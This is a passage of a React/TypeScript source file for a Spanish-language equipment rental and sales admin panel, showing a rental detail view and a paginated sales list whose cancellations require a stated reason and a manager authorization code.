              mensaje='La renta aparecerá en "Tus rentas" del cliente que elijas.'
              onElegir={vincularCuenta}
              onCancelar={() => setBuscandoCuenta(false)}
            />
          )}

          {/* CLIENTE */}
          <div className="px-6 sm:px-[26px] py-[18px] border-b border-edge">
            <Titulo>CLIENTE</Titulo>
            <div className="grid grid-cols-2 gap-x-4 gap-y-3">
              {r.empresa && <Field label="Empresa" value={r.empresa.nombre} />}
              {r.obra && <Field label="Obra" value={r.obra.nombre} />}
              {encargado && <Field label="Encargado" value={encargado} />}
              {cliente && <Field label="Cliente" value={cliente} />}
              {telefono && <Field label="Teléfono" value={telefono} />}
              <Field label="Ubicación / entrega" value={r.obra?.ubicacion || r.direccion} full />
              <div className="col-span-2 pt-2 border-t border-edge space-y-3">
                <div className="flex items-center justify-between gap-3">
                  <div className="min-w-0">
                    <p className="text-[12px] text-mute">Cuenta en el sistema</p>
                    <p className={`text-[13.5px] font-bold mt-0.5 truncate ${cuenta ? 'text-ink' : 'text-mute'}`}>{cuenta || 'Sin vincular'}</p>
                  </div>
                  {/* Ya vinculada: no hay botón de cambiar. Mover una renta de
                      una cuenta a otra se la quita del historial a una persona y
                      se la cuelga a otra, sin que ninguna se entere. Si el
                      cliente resultó tener dos cuentas, se funden sus fichas
                      desde Clientes: ahí la operación arrastra todo junto y
                      queda anotada. */}
                  {cuenta ? (
                    <span className="shrink-0 inline-flex items-center gap-1.5 text-[11.5px] font-semibold text-mute" title="Para corregirlo, funde las fichas del cliente desde la sección Clientes">
                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2" strokeLinecap="round"><rect x="4" y="10.5" width="16" height="10" rx="2" /><path d="M8 10.5V7a4 4 0 0 1 8 0v3.5" /></svg>
                      Vinculada
                    </span>
                  ) : (
                    <button onClick={() => setBuscandoCuenta(true)} className="shrink-0 px-3.5 py-2 rounded-[9px] border border-edge text-[12px] font-bold text-ink hover:border-gold/50 hover:text-gold-ink transition-colors">
                      Vincular cuenta
                    </button>
                  )}
                </div>
                {/* Liga: el cliente la abre y liga la renta a SU cuenta (un solo
                    uso, 30 días). Con cuenta YA vinculada no hay nada que ligar:
                    ni liga vieja ni botón de generar. */}
                {cuenta ? null : liga ? (
                  <div className="space-y-2">
                    <div className="flex items-center gap-2">
                      <input aria-label="Liga para compartir" readOnly value={liga} onFocus={e => e.currentTarget.select()} className="flex-1 bg-app border border-edge rounded-[9px] px-3 py-2 text-[11px] text-ink outline-none" />
                      <button onClick={async () => { try { await navigator.clipboard.writeText(liga); setCopiado(true); setTimeout(() => setCopiado(false), 1500) } catch { /* noop */ } }} className="shrink-0 px-3 py-2 rounded-[9px] bg-gold text-black text-[12px] font-bold">{copiado ? '✓' : 'Copiar'}</button>
                    </div>
                    {(() => {
                      const tel = (telefono || '').replace(/\D/g, ''); const num = tel.length === 10 ? '52' + tel : tel
                      const msg = `Hola, aquí tienes tu renta en REMALI. Ábrela para guardarla en tu cuenta:\n${liga}`
                      return <a href={`https://wa.me/${num}?text=${encodeURIComponent(msg)}`} target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 w-full py-2 rounded-[9px] bg-[#25D366] text-white text-[12px] font-bold hover:opacity-90 transition-opacity"><svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor"><path d="M17.5 14.4c-.3-.15-1.7-.84-2-.94-.26-.1-.45-.15-.64.15-.19.29-.74.94-.9 1.13-.17.19-.33.22-.62.07-.3-.15-1.25-.46-2.38-1.47-.88-.78-1.47-1.75-1.64-2.05-.17-.29-.02-.45.13-.6.13-.13.29-.34.44-.5.15-.17.19-.29.29-.48.1-.19.05-.36-.02-.5-.08-.15-.64-1.55-.88-2.12-.23-.56-.47-.48-.64-.49h-.55c-.19 0-.5.07-.76.36-.26.29-1 .98-1 2.38s1.02 2.76 1.17 2.95c.15.19 2.01 3.07 4.87 4.3.68.29 1.21.47 1.62.6.68.22 1.3.19 1.79.11.55-.08 1.7-.69 1.94-1.36.24-.67.24-1.24.17-1.36-.07-.12-.26-.19-.55-.34zM12 2a10 10 0 00-8.6 15.06L2 22l5.06-1.33A10 10 0 1012 2z"/></svg>Enviar por WhatsApp</a>
                    })()}
                  </div>
                ) : (
                  <button onClick={generarLiga} disabled={genLiga} className="text-[12px] font-semibold text-mute hover:text-gold-ink transition-colors disabled:opacity-50">
                    {genLiga ? 'Generando…' : '＋ Generar liga para que el cliente la vincule solo'}
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* RENTA */}
          <div className="px-6 sm:px-[26px] py-[18px] border-b border-edge">
            <Titulo>RENTA</Titulo>
            <div className="grid grid-cols-2 gap-x-4 gap-y-3">
              <Field label="Modalidad" value={`${modLabel}${r.duracion ? ` (${r.duracion})` : ''}`} />
              <Field label="Inicio" value={r.fecha_inicio || '—'} />
              <Field label={r.estado === 'activa' && !r.vencida ? 'Vencimiento' : 'Vencimiento'} value={r.fecha_fin} />
              {r.estado === 'activa' && (
                <Field label="Estado" value={r.vencida ? 'Vencida'
                  : (r.horas_restantes !== undefined && r.horas_restantes < 24)
                    ? `${Math.max(1, Math.round(r.horas_restantes))} hora(s) restantes`
                    : `${r.dias_restantes} día(s) restantes`} labelCls={r.vencida ? 'text-red-500' : 'text-mute'} />
              )}
              {r.fecha_devolucion_real && <Field label="Devolución real" value={r.fecha_devolucion_real} labelCls="text-emerald-600" />}
            </div>

            {/* Quién movió el equipo y cuándo: lo confirma el técnico en campo */}
            {(r.entrega || r.recoleccion) && (
              <div className="mt-4 pt-4 border-t border-edge grid grid-cols-2 gap-x-4 gap-y-3">
                <Field label="Entrega"
                  value={r.entrega?.entregada
                    ? <>{new Date(r.entrega.en!).toLocaleString('es-MX', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' })}{r.entrega.por ? <span className="text-mute font-normal"> · {r.entrega.por}</span> : null}</>
                    : <span className="text-taller-ink dark:text-taller-ink">Sin confirmar</span>} />
                <Field label="Recolección"
                  value={r.recoleccion?.recogida
                    ? <>{new Date(r.recoleccion.en!).toLocaleString('es-MX', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' })}{r.recoleccion.por ? <span className="text-mute font-normal"> · {r.recoleccion.por}</span> : null}</>
                    : <span className="text-mute">Pendiente</span>} />
              </div>
            )}
          </div>

          {/* MONTOS */}
          <div className="px-6 sm:px-[26px] py-[18px]">
            <Titulo>MONTOS</Titulo>
            <div className="space-y-1.5 text-[13px]">
              <div className="flex justify-between"><span className="text-mute">Precio {modLabel.toLowerCase()}</span><span className="text-ink font-semibold">{money(r.precio_unitario)}</span></div>
              {desc > 0 && <div className="flex justify-between"><span className="text-mute">Descuento</span><span className="text-red-500 font-semibold">− {money(desc)}</span></div>}
              {(iva > 0 || rec > 0) && <div className="flex justify-between"><span className="text-mute">Subtotal</span><span className="text-ink font-semibold">{money(sub)}</span></div>}
              {iva > 0 && <div className="flex justify-between"><span className="text-mute">IVA (16%)</span><span className="text-ink font-semibold">{money(iva)}</span></div>}
              {rec > 0 && <div className="flex justify-between"><span className="text-mute">Recargo por retraso</span><span className="text-taller-ink font-semibold">{money(rec)}</span></div>}
              <div className="flex justify-between pt-2.5 mt-1.5 border-t border-edge text-[16px] font-extrabold"><span className="text-ink">Total</span><span className="text-price">{money(tot)}</span></div>
              {dep > 0 && <div className="flex justify-between pt-1"><span className="text-mute text-[12px]">Depósito en garantía</span><span className="text-mute text-[12px]">{money(dep)}</span></div>}
            </div>

            {/* PAGOS: abonos del cliente y saldo (muchos pagan después) */}
            <div className="mt-4 pt-4 border-t border-edge">
              <div className="flex items-center justify-between gap-3 mb-2">
                <p className="text-[11px] font-extrabold tracking-[0.5px] text-gold-ink">PAGOS</p>
                {saldo <= 0 && tot > 0 ? (
                  <span className="inline-flex items-center gap-1.5 text-[11px] font-bold px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-600"><svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="3"><path d="M5 13l4 4L19 7" /></svg>Pagada</span>
                ) : (
                  <span className="text-[11px] font-bold px-2.5 py-1 rounded-full bg-amber-500/10 text-taller-ink whitespace-nowrap">Por cobrar {money(saldo)}</span>
                )}
              </div>
              {pagos.length > 0 && (
                <div className="space-y-1 text-[12.5px] mb-2">
                  {pagos.map((p, i) => (
                    <div key={i} className="flex justify-between gap-3">
                      <span className="text-mute">{new Date(p.fecha.length === 10 ? `${p.fecha}T12:00:00` : p.fecha).toLocaleDateString('es-MX', { day: '2-digit', month: 'short' })} · <span className="capitalize">{p.metodo}</span>{p.por ? ` · ${p.por}` : ''}</span>
                      <span className="text-ink font-semibold tabular-nums">{money(Number(p.monto))}</span>
                    </div>
                  ))}
                  <div className="flex justify-between gap-3 pt-1 border-t border-edge">
                    <span className="text-mute font-semibold">Pagado</span>
                    <span className="text-ink font-bold tabular-nums">{money(pagado)}</span>
                  </div>
                </div>
              )}
              {abonando && <AbonoModal saldo={saldo} onClose={() => setAbonando(false)} onRegistrar={guardarAbono} />}
              {r.estado !== 'cancelada' && saldo > 0 && (
                <button onClick={() => setAbonando(true)}
                  className="mt-1 px-3.5 py-2 rounded-[9px] border border-edge text-[12px] font-bold text-ink hover:border-gold/50 hover:text-gold-ink transition-colors">
                  + Registrar abono
                </button>
              )}
            </div>
          </div>

          {/* FACTURACIÓN: el timbrado es externo; aquí solo se manda a la bandeja */}
          <div className="px-6 sm:px-[26px] py-[18px] border-t border-edge">
            <div className="flex items-center justify-between gap-3 flex-wrap">
              <div className="min-w-0 flex-1">
                <p className="text-[11px] font-extrabold tracking-[0.5px] text-gold-ink">FACTURACIÓN</p>
                <p className="text-[12px] text-mute mt-1 leading-relaxed">
                  {factura === 'facturada'
                    ? 'Factura emitida; quedó registrada en la bandeja.'
                    : factura
                      ? 'Está en la bandeja Por facturar. Se timbra afuera y ahí se marca.'
                      : 'Si el cliente pide factura, mándala a la bandeja: sus datos fiscales se toman de su cuenta.'}
                </p>
              </div>
              {!factura && r.estado !== 'cancelada' && (
                <button onClick={mandarPorFacturar} disabled={mandandoFactura}
                  className="px-3.5 py-2 rounded-[9px] border border-amber-500/40 bg-amber-500/10 text-[12px] font-bold text-taller-ink hover:bg-amber-500/20 transition-colors whitespace-nowrap disabled:opacity-50">
                  {mandandoFactura ? 'Mandando…' : 'Mandar a Por facturar'}
                </button>
              )}
            </div>
          </div>

          {/* EVIDENCIA: respalda en qué estado salió y en qué estado volvió */}
          <div className="px-6 sm:px-[26px] py-[18px] border-t border-edge">
            <Titulo>EVIDENCIA DEL EQUIPO</Titulo>
            <p className="text-[12px] text-mute -mt-1.5 mb-4">
              {dep > 0
                ? `Respalda por qué retienes o devuelves el depósito de ${money(dep)}.`
                : 'Deja constancia del estado en que salió y en que regresó el equipo.'}
            </p>
            <EvidenciasRenta rentaId={r.id} />
          </div>
        </div>

        {/* Avería: cambiar la máquina por una de repuesto sin tocar la renta. */}
        {r.estado === 'activa' && (
          <div className="px-6 sm:px-[26px] pt-4 -mb-1">
            <button onClick={sustituirPorAveria}
              className="w-full flex items-center justify-center gap-2 h-10 rounded-[9px] border border-amber-500/40 bg-amber-500/10 text-taller-ink text-[13px] font-bold hover:bg-amber-500/20 transition-colors">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round"><path d="M14.7 6.3a4 4 0 0 0-5.6 5.6l-6 6v3h3l6-6a4 4 0 0 0 5.6-5.6l-2.5 2.5-2.1-2.1z" /></svg>
              Se averió — sustituir por una de repuesto
            </button>
          </div>
        )}

        {/* Footer */}
        <div className="px-6 sm:px-[26px] py-5 border-t border-edge flex items-center gap-2.5 shrink-0">
          <button onClick={onClose} className="h-11 px-4 rounded-[9px] border border-edge text-ink text-[13.5px] font-bold hover:bg-surface-2 transition-colors">Cerrar</button>
          {/* "Me la quedo otra semana" es de las cosas que más se piden en el
              mostrador y no tenía botón: había que cerrar la renta a mano y
              levantar otra desde cero. Va aquí, en el detalle, que es donde
              estás cuando el cliente llama a pedirlo. */}
          {(r.estado === 'activa' || r.estado === 'finalizada') && (
            <button onClick={() => setRenovando(true)} className="flex-1 h-11 rounded-[9px] border border-renta/40 text-renta text-[13.5px] font-bold hover:bg-renta/10 transition-colors">
              {r.estado === 'activa' ? 'Renovar' : 'Volver a rentar'}
            </button>
          )}
          <button onClick={onOrdenCarta} className="flex-1 h-11 rounded-[9px] bg-gold text-black text-[13.5px] font-bold hover:brightness-95 transition-all">Orden carta (PDF)</button>
        </div>
        {renovando && (
          <RenovarRentaModal
            renta={r} notify={notify || (() => {})}
            onClose={() => setRenovando(false)}
            onHecho={() => { setRenovando(false); onChanged?.(); onClose() }}
          />
        )}
      </div>
    </Modal>,
    document.body
  )
}

/** Los KPIs del periodo, calculados en la BD. El dinero puede NO venir: a quien
 *  no lo puede ver se le omiten esos campos en vez de mandarlos en cero. */
type VentaStats = {
  total: number; activas: number; apartadas: number; canceladas: number; maquinaria: number
  total_vendido?: string; ticket?: string
}
type PaginaVentas = { ventas: Venta[]; total: number; pagina: number; paginas: number }
/** Lo que devuelve `/ventas/lista/` por página cuando no se le pide otra cosa
 *  (ver `page_size` en ventas/views.py). El pie lo necesita para escribir
 *  "mostrando 26 a 50". */
const PAGINA_VENTAS = 50

/** Por qué no se pudo cargar, en palabras que digan qué hacer. */
function motivoDeCarga(err: any): string {
  const status = err?.response?.status
  if (status === 403) return 'Tu sesión no tiene permiso para ver las ventas. Vuelve a entrar con tu cuenta del panel.'
  if (!err?.response) return 'Sin conexión con el servidor. Revisa tu internet.'
  if (status >= 500) return 'El servidor falló al traer las ventas.'
  return 'No se pudieron cargar las ventas.'
}

function VentasAdmin({ notify }: { notify: Notify }) {
  const [q, setQ] = useState('')
  const [qDebounced, setQDebounced] = useState('')
  const [anio, setAnio] = useState<number>(new Date().getFullYear())
  const [mes, setMes] = useState<number>(0)
  const [ventas, setVentas] = useState<Venta[]>([])
  const [stats, setStats] = useState<VentaStats | null>(null)
  const [pagina, setPagina] = useState(1)
  const [paginas, setPaginas] = useState(1)
  const [totalPeriodo, setTotalPeriodo] = useState(0)
  const anclaVentas = useRef<HTMLDivElement | null>(null)
  const [falloVentas, setFalloVentas] = useState<string | null>(null)
  const [cargando, setCargando] = useState(false)
  const [detalle, setDetalle] = useState<Venta | null>(null)

  // Se teclea y se espera un poco antes de ir al servidor; al buscar o cambiar
  // de periodo se vuelve a la página 1, o te quedas mirando una página 4 vacía.
  useEffect(() => {
    const t = setTimeout(() => { setQDebounced(q); setPagina(1) }, 350)
    return () => clearTimeout(t)
  }, [q])
  useEffect(() => { setPagina(1) }, [anio, mes])

  /* Acabas de registrar una venta y la sección abrió para enseñártela: se abre su
     detalle en cuanto llega la lista (la venta es de hoy, así que cae en el
     periodo que abre por defecto). De un solo uso: si por lo que sea no viene en
     la lista, no se persigue —te quedas en la sección, que ya es a donde ibas. */
  const ventaAAbrir = useRef<number | null>(tomarVentaAAbrir())

  /* Los KPIs ya NO se calculan sumando la lista: con la lista paginada, sumar
     lo que llegó daría un "Monto total" que cambia al pasar de página. Vienen
     de `/ventas/stats/`, que los saca en SQL sobre todo el periodo. Y el
     dinero puede no venir: a quien no lo puede ver se le OMITEN esos campos
     (un cero se leería como "$0.00 vendido", que es falso). */
  const cargarStats = useCallback(() => {
    const params = new URLSearchParams({ anio: String(anio) })
    if (mes) params.set('mes', String(mes))
    api.get<VentaStats>(`/ventas/stats/?${params.toString()}`, { fondo: true })
      .then(r => { setStats(r.data); setFalloVentas(null) })
      .catch(err => setFalloVentas(motivoDeCarga(err)))
  }, [anio, mes])

  const cargar = useCallback(() => {
    setCargando(true)
    const params = new URLSearchParams({ anio: String(anio), page: String(pagina) })
    if (mes) params.set('mes', String(mes))
    if (qDebounced.trim()) params.set('q', qDebounced.trim())
    api.get<PaginaVentas>(`/ventas/lista/?${params.toString()}`, { fondo: true })
      .then(r => {
        const lista = r.data?.ventas || []
        setVentas(lista)
        setPaginas(r.data?.paginas || 1)
        setTotalPeriodo(r.data?.total || 0)
        setFalloVentas(null)
        if (ventaAAbrir.current !== null) {
          const v = lista.find(x => x.id === ventaAAbrir.current)
          ventaAAbrir.current = null
          if (v) setDetalle(v)
        }
      })
      .catch(err => setFalloVentas(motivoDeCarga(err)))
      .finally(() => setCargando(false))
  }, [anio, mes, pagina, qDebounced])
  useEffect(() => { cargar() }, [cargar])
  useRecurso(['ventas'], cargar)   // realtime: si otro registra o cancela una venta
  useRecurso(['ventas'], cargarStats)   // y los KPIs con ella: viven en el servidor

  /* Cancelar una venta es de las acciones más delicadas del panel: devuelve la
     máquina a inventario, repone stock y genera un movimiento inverso de caja.
     El backend ya exigía MOTIVO y CÓDIGO de autoridad (`cancelar_venta` en
     ventas/views.py), pero el panel llamaba al endpoint con el cuerpo vacío: la
     cancelación fallaba SIEMPRE y el usuario solo veía "Error". Aquí se piden
     los dos, en el orden en que los pide la regla: primero por qué, luego quién
     lo autoriza. */
  async function cancelar(v: Venta) {
    const etiqueta = v.folio || `#${v.id}`
    if (!await confirmar({
      titulo: `¿Cancelar la venta ${etiqueta}?`,
      mensaje: 'La máquina vuelve a inventario, se repone el stock y queda un movimiento inverso en caja. No se puede deshacer.',
      aceptar: 'Continuar', cancelar: 'Volver', tono: 'peligro',
    })) return

    const motivo = await pedir({
      titulo: 'Motivo de la cancelación',
      mensaje: 'Queda en el historial de la venta, junto con quién la autorizó.',
      placeholder: 'Ej. El cliente se arrepintió; la máquina no salió del local.',
    })
    if (motivo === null) return
    if (!motivo.trim()) { notify('El motivo es obligatorio para cancelar una venta', 'err'); return }

    const codigo = await pedir({
      titulo: 'Código de autorización',
      mensaje: 'Los 6 dígitos de un administrador o gerente. Un operador no puede autorizar su propia cancelación.',
      placeholder: '••••••', inputMode: 'decimal',
    })
    if (codigo === null) return

    api.post(`/ventas/${v.id}/cancelar/`, { motivo: motivo.trim(), codigo_seguridad: codigo.trim() })
      .then(() => { notify('Venta cancelada', 'neutro'); cargar() })
      .catch(e => notify(e?.response?.data?.detalle || 'No se pudo cancelar la venta', 'err'))
  }
  /** Sacar UNA máquina de una venta de varias: vuelve al inventario y el total
   *  baja. Es acción sensible, así que pide motivo y código, igual que cancelar. */
  const quitarMaquina = async (v: Venta, maquinaId: number) => {
    const m = v.maquinas?.find(x => x.id === maquinaId)
    const motivo = await pedir({
      titulo: `¿Quitar ${m?.codigo || 'la máquina'} de la venta?`,
      mensaje: 'La máquina vuelve al inventario y el total de la venta baja. Queda registrado quién lo autorizó.',
      placeholder: 'Ej. Salió con falla de fábrica; se dañó en el traslado.',
    })
    if (motivo === null) return
    if (!motivo.trim()) { notify('El motivo es obligatorio', 'err'); return }
    const codigo = await pedir({
      titulo: 'Código de autorización',
      mensaje: 'Los 6 dígitos de un administrador o gerente.',
      placeholder: '••••••', inputMode: 'decimal',
    })
    if (codigo === null) return
    try {
      await api.post(`/ventas/${v.id}/maquinas/${maquinaId}/quitar/`, { motivo: motivo.trim(), codigo_seguridad: codigo.trim() })
      notify('Máquina devuelta al inventario', 'neutro')
      setDetalle(null)
      cargar()
    } catch (e: unknown) {
      notify((e as { response?: { data?: { detalle?: string } } })?.response?.data?.detalle || 'No se pudo quitar la máquina', 'err')
    }
  }
  // La búsqueda la resuelve el servidor: si se filtrara aquí, solo miraría la
  // página visible y una venta de hace ocho meses no aparecería nunca.
  const filtradas = ventas

  const metodoStyle: Record<string, string> = {
    efectivo: 'bg-emerald-500/10 text-emerald-500',
    tarjeta: 'bg-blue-500/10 text-blue-500',
    transferencia: 'bg-violet-500/10 text-violet-500',
  }

  return (
    <div className="space-y-5">
      {detalle && <VentaDetalleModal venta={detalle} onClose={() => setDetalle(null)} onChanged={cargar} notify={notify} onQuitarMaquina={(id) => quitarMaquina(detalle, id)} />}
      {/* KPIs */}
      <KpiGrid
        items={[
          {
            label: 'Ventas del periodo', value: stats ? stats.total : '—', tone: 'default',
            helper: stats ? `${stats.maquinaria} de maquinaria · ${stats.total - stats.maquinaria} de mostrador` : undefined,
            icon: <><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" /></>,
          },
          { label: 'De maquinaria', value: stats ? stats.maquinaria : '—', tone: 'muted', helper: 'salieron del inventario', icon: <><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" /><path d="M3.3 7 12 12l8.7-5M12 22V12" /></> },
          // El rótulo dice "sin cancelar" porque ahora es verdad: antes se
          // sumaban también las canceladas y el monto decía tener un dinero
          // que nunca entró.
          {
            label: 'Monto vendido', value: stats?.total_vendido !== undefined ? <Monto valor={stats.total_vendido} /> : '—', tone: 'gold',
            helper: 'sin canceladas · IVA incluido', icon: <><path d="M12 1v22" /><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /></>,
          },
          { label: 'Ticket promedio', value: stats?.ticket !== undefined ? <Monto valor={stats.ticket} /> : '—', tone: 'default', helper: 'por venta del periodo', icon: <><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></> },
        ]}
      />

      {falloVentas && (
        <div role="alert" className="flex items-center gap-3 rounded-2xl border border-red-500/40 bg-red-500/10 px-4 py-3">
          <span className="text-sm text-ink flex-1">{falloVentas}</span>
          <button onClick={() => { cargar(); cargarStats() }} className="shrink-0 text-sm font-bold text-gold hover:underline">Reintentar</button>
        </div>
      )}

      <Card ref={anclaVentas} className="overflow-hidden scroll-mt-24">
        {/* Toolbar */}
        <CardBarra titulo="Historial de ventas" cuenta={totalPeriodo}>
          <SelectorPeriodo anio={anio} mes={mes} onAnio={setAnio} onMes={setMes} className="sm:ml-auto" />
          <div className="relative flex-1 sm:max-w-xs">
            <svg className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-mute pointer-events-none" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><circle cx="9" cy="9" r="6" /><path d="M15 15l3 3" strokeLinecap="round" /></svg>
            <input aria-label="Buscar folio, cliente o equipo" value={q} onChange={e => setQ(e.target.value)} placeholder="Buscar folio, cliente o equipo..."
              className="campo campo-sm pl-10" />
          </div>
          <button onClick={cargar} className="text-xs text-mute hover:text-gold-ink transition-colors shrink-0">Actualizar</button>
          <BotonExportar onClick={() => {
            // El reporte respeta el periodo del selector (mes 0 = todo el año).
            const mm = String(mes).padStart(2, '0')
            const p = mes
              ? { desde: `${anio}-${mm}-01`, hasta: `${anio}-${mm}-${String(new Date(anio, mes, 0).getDate()).padStart(2, '0')}` }
              : { desde: `${anio}-01-01`, hasta: `${anio}-12-31` }
            descargarReporte('/ventas/export/', p, `reporte_ventas_${anio}${mes ? '-' + mm : ''}.csv`, notify)
          }} />
        </CardBarra>

        {/* Tabla */}
        <div className="overflow-x-auto">
          <table className="tabla-panel w-full min-w-[760px] text-left">
            <thead>
              <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                <th className="font-semibold px-5 py-3">Cliente</th>
                <th className="font-semibold px-3 py-3">Equipo / Unidad</th>
                <th className="font-semibold px-3 py-3">Fecha</th>
                <th className="font-semibold px-3 py-3">Pago</th>
                <th className="font-semibold px-3 py-3">Vendedor</th>
                <th className="font-semibold px-5 py-3 text-right">Total</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-edge">
              {filtradas.map(v => (
                <tr key={v.id} className="hover:bg-surface-2 transition-colors">
                  <td className="px-5 py-3">
                    <div className="flex items-center gap-2.5">
                      <span className="w-8 h-8 rounded-lg bg-gold-soft text-gold-ink flex items-center justify-center shrink-0 font-black text-sm">{(v.nombre_cliente?.[0] || '#').toUpperCase()}</span>
                      <div className="min-w-0">
                        <span className="font-mono text-[10.5px] text-mute block">{v.folio || `#${v.id}`}</span>
                        <span className="text-sm font-semibold text-ink truncate block">{v.nombre_cliente || 'Cliente general'}</span>
                        {v.cuenta && (
                          <span className="text-[10.5px] text-emerald-600 dark:text-emerald-400 font-medium truncate flex items-center gap-1">
                            <svg className="w-3 h-3 shrink-0" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M9 12h6m-3-3v6M7.5 7.5l-1 1a3.5 3.5 0 000 5l1 1m9-9l1 1a3.5 3.5 0 010 5l-1 1"/></svg>
                            Ligada a {v.cuenta}
                          </span>
                        )}
                      </div>
                    </div>
                  </td>
                  <td data-col="Equipo" className="px-3 py-3">
                    <div>
                      {(v.maquinas?.length || 0) > 1 ? (
                        /* Varias máquinas en una venta: se nombran todas. Decir
                           solo la primera fue justo el error que dejaba máquinas
                           fuera del inventario sin que nadie lo viera. */
                        <>
                          <p className="text-sm text-ink truncate">{v.maquinas![0].equipo} · <span className="font-semibold">{v.maquinas!.length} máquinas</span></p>
                          <p className="font-mono text-[11px] text-mute truncate" title={v.maquinas!.map(m => m.codigo).join(', ')}>
                            {v.maquinas!.map(m => m.codigo).join(' · ')}
                          </p>
                        </>
                      ) : v.unidad ? (
                        <><p className="text-sm text-ink truncate">{v.unidad.equipo}</p><p className="font-mono text-[11px] text-mute">{v.unidad.codigo}</p></>
                      ) : v.origen ? (
                        <><p className="text-sm text-ink truncate">{v.origen.resumen || 'Venta desde cotización'}</p><p className="font-mono text-[11px] text-mute">{v.origen.folio} · sin unidad asignada</p></>
                      ) : <span className="text-xs text-mute">—</span>}
                    </div>
                  </td>
                  <td data-col="Fecha" className="px-3 py-3 whitespace-nowrap text-xs text-mute"><span>{new Date(v.fecha).toLocaleDateString('es-MX', { day: '2-digit', month: 'short', year: 'numeric' })}</span></td>
                  <td data-col="Pago" className="px-3 py-3">
                    <span className={`text-[10px] px-2 py-0.5 rounded-md font-semibold uppercase ${metodoStyle[v.metodo_pago] || 'bg-surface-2 text-mute'}`}>{v.metodo_pago}</span>
                  </td>
                  <td data-col="Vendedor" className="px-3 py-3 text-xs text-mute"><span>{v.vendedor || '—'}</span></td>
                  <td className="px-5 py-3 text-right whitespace-nowrap">
                    <div className="flex flex-wrap items-center justify-end gap-2">
                      <div className="text-right">
                        <span className={`text-sm font-black ${v.estado === 'cancelada' ? 'text-mute line-through' : 'text-price'}`}>${(Number(v.total) || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
                        {v.iva && <p className="text-[10px] text-mute">IVA ${Number(v.iva).toLocaleString('en-US', { minimumFractionDigits: 2 })}</p>}
                        {v.estado === 'cancelada' && <p className="text-[10px] text-red-500 font-semibold uppercase">Cancelada</p>}
                      </div>
                      <button onClick={() => setDetalle(v)} title="Ver detalle" aria-label="Ver detalle de la venta" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-ink hover:border-ink/30 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ink/20 transition-colors flex items-center justify-center shrink-0">
                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
                      </button>
                      {v.estado !== 'cancelada' && (
                        <button onClick={() => cancelar(v)} title="Cancelar venta" aria-label="Cancelar venta" className="w-8 h-8 rounded-lg border border-red-500/30 text-red-600 dark:text-red-400 hover:bg-red-500/10 hover:border-red-500/50 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-red-500/30 transition-colors flex items-center justify-center shrink-0">
                          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                        </button>
                      )}
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          {filtradas.length === 0 && (cargando ? <FilasEsqueleto filas={6} columnas={4} /> : (
            <EstadoVacio
              titulo={falloVentas ? 'No se pudo cargar la lista' : q ? 'Sin resultados' : 'Sin ventas en el periodo'}
              mensaje={falloVentas
                ? 'La petición no llegó al servidor. Vuelve a intentarlo; si sigue igual, revisa la conexión.'
                : q ? 'Busca por folio, cliente o modelo.' : 'Cambia el periodo de arriba para ver otro tramo de tiempo.'}
              icono={falloVentas
                ? <><circle cx="12" cy="12" r="9" /><path d="M12 8v5m0 3h.01" /></>
                : <><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" /></>}
            />
          ))}
        </div>

        {/* La lista la pagina el SERVIDOR (`/ventas/` devuelve pagina/paginas):
            aquí solo se dice en cuál va y se pide la siguiente. */}
        <Paginador pagina={pagina} paginas={paginas} total={totalPeriodo}
          porPagina={PAGINA_VENTAS} onIr={setPagina} ancla={anclaVentas}
          cargando={cargando} nombre="ventas" />
      </Card>
    </div>
  )
}

/* ════════════════════════════════════════
   LA CAMPANA
════════════════════════════════════════ */
/* La SECCIÓN "Notificaciones" se retiró (ago-2026): duplicaba la campana de
   arriba, que es donde la gente las lee. El fechado de cada renglón lo pone
   ahora `cuandoLlego` (lib/utils), compartido con la campana del cliente: aquí
   vivía una segunda copia que se quedaba en "hace 3 d", sin hora y sin fecha.
   Nadie puede cotejar un abono contra una llamada con eso. */

/* ════════════════════════════════════════
   CATÁLOGOS CRUD (Categorías / Tipos / Marcas)
════════════════════════════════════════ */
